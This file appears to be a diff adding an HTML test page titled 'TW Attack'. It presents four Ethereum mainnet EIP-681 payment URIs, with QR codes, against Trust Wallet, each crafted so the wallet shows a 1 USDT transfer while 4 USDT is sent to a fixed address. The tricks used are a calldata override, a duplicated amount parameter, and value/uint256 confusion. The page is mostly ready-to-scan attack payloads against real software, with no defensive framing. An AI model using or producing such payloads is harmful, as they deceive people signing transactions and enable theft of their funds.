@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW Attack — EIP-681 /transfer Candidates (Mainnet)</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; }
+    h1 { font-size: 20px; margin-bottom: 4px; color: #f0883e; }
+    .subtitle { font-size: 12px; color: #8b949e; margin-bottom: 16px; }
+    .variant { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    .variant h2 { font-size: 15px; margin-bottom: 2px; color: #e6edf3; }
+    .variant .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 600; margin-bottom: 6px; }
+    .badge-main { background: #d2992222; color: #d29922; border: 1px solid #d2992244; }
+    .qr-img { width: 240px; height: 240px; display: block; margin: 8px auto; border-radius: 8px; background: white; padding: 8px; }
+    .uri-box { font-size: 10px; color: #8b949e; word-break: break-all; background: #0d1117; padding: 8px; border-radius: 6px; margin: 8px 0; font-family: monospace; max-height: 100px; overflow-y: auto; border: 1px solid #21262d; }
+    .info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 8px 0; }
+    .info div { background: #0d1117; padding: 6px 8px; border-radius: 6px; }
+    .info .label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
+    .info .value { font-size: 13px; font-weight: 600; margin-top: 2px; }
+    .info .value.red { color: #ff6b6b; }
+    .info .value.green { color: #3fb950; }
+    .logic { font-size: 11px; color: #8b949e; background: #0d1117; padding: 8px; border-radius: 6px; margin-top: 8px; border-left: 3px solid #f0883e; }
+    .note { background: #f0883e11; border: 1px solid #f0883e33; border-radius: 8px; padding: 12px; font-size: 12px; margin-bottom: 16px; color: #c9d1d9; }
+    .note strong { color: #f0883e; }
+    .attribution { text-align: center; font-size: 10px; color: #484f58; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>🔬 EIP-681 /transfer — 4 Candidates</h1>
+  <p class="subtitle">Mainnet • USDT • Display=1 USDT • Execute=4 USDT • All use /transfer function name</p>
+
+  <div class="note">
+    <strong>Approach:</strong> All 4 use the EIP-681 <code>/transfer</code> function name format. The goal is to make Trust Wallet display 1 USDT (from <code>uint256=1000000</code>) but execute 4 USDT through parameter confusion, data override, or duplicate values.
+  </div>
+
+  <div class="variant">
+    <span class="badge badge-main">Mainnet</span>
+    <h2>T1: pay- prefix + data override</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3Apay-0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR T1" loading="lazy">
+    <div class="uri-box">ethereum:pay-0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Should Display</div>
+        <div class="value red">1 USDT (from uint256)</div>
+      </div>
+      <div>
+        <div class="label">⚡ Should Execute</div>
+        <div class="value green">4 USDT (from data override)</div>
+      </div>
+    </div>
+    <div class="logic">💡 pay- prefix may trigger different parser path. uint256=1M sets display to 1 USDT. data=4USDT_calldata overrides execution if wallet passes data through.</div>
+  </div>
+
+  <div class="variant">
+    <span class="badge badge-main">Mainnet</span>
+    <h2>T2: Duplicate uint256 (first=display, last=execute)</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26uint256%3D4000000" alt="QR T2" loading="lazy">
+    <div class="uri-box">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&uint256=4000000</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Should Display</div>
+        <div class="value red">1 USDT (first uint256)</div>
+      </div>
+      <div>
+        <div class="label">⚡ Should Execute</div>
+        <div class="value green">4 USDT (second uint256?)</div>
+      </div>
+    </div>
+    <div class="logic">💡 If parser reads first uint256 for display but last uint256 for ABI encoding, mismatch occurs. Standard URI parsers often take last value for duplicate keys.</div>
+  </div>
+
+  <div class="variant">
+    <span class="badge badge-main">Mainnet</span>
+    <h2>T3: value/uint256 confusion</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26value%3D4000000" alt="QR T3" loading="lazy">
+    <div class="uri-box">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&value=4000000</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Should Display</div>
+        <div class="value red">1 USDT (from uint256) or 4 ETH (from value?)</div>
+      </div>
+      <div>
+        <div class="label">⚡ Should Execute</div>
+        <div class="value green">4 USDT if wallet confuses value with token amount</div>
+      </div>
+    </div>
+    <div class="logic">💡 EIP-681 says 'value' = native ETH. But if wallet's ERC-20 parser uses 'value' instead of 'uint256' for token amount, it executes 4M instead of 1M.</div>
+  </div>
+
+  <div class="variant">
+    <span class="badge badge-main">Mainnet</span>
+    <h2>T4: data override (no pay- prefix)</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26uint256%3D1000000%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR T4" loading="lazy">
+    <div class="uri-box">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&uint256=1000000&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Should Display</div>
+        <div class="value red">1 USDT (from uint256)</div>
+      </div>
+      <div>
+        <div class="label">⚡ Should Execute</div>
+        <div class="value green">4 USDT (from data)</div>
+      </div>
+    </div>
+    <div class="logic">💡 Standard EIP-681 /transfer. uint256=1M sets display. If wallet also accepts 'data' as raw calldata and prioritizes it over self-built calldata, execution = 4 USDT.</div>
+  </div>
+
+  <p class="attribution">Scan with Trust Wallet • Report exact confirmation screen (amount, recipient, network, function name)</p>
+</body>
+</html>
